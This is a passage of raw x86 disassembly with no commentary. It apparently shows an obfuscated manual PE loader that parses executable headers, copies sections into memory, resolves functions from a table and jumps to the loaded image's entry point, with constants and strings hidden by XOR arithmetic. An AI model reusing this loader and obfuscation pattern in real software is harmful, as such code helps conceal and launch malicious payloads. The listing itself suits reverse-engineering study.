  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
